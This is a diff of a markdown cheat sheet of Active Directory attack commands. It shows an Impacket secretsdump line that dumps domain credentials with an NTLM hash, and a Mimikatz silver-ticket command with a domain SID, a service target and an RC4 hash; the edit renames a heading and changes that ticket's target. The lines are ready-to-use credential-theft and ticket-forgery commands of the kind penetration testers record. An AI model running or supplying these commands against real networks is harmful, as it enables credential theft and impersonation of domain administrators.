@@ -21,7 +21,7 @@
 | python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889  -just-dc acmebank.loca/Administrator@192.168.100.10 |
 
 
-### Mimikatz Guide
+### Mimikatz 
 
 | Pass-the-Hash  |
 | ------------- |
@@ -29,7 +29,7 @@
 
 |Silver Tickets  |
 | ------------- |
-|kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /target:fs01 /rc4:47b1d9d581f29b3b43845692bd4a0322 /service:cifs /ptt|
+|kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /target:ninja.corp  /rc4:47b1d9d581f29b3b43845692bd4a0322 /service:cifs /ptt|
 
 |Golden Tickets |
 | ------------- |
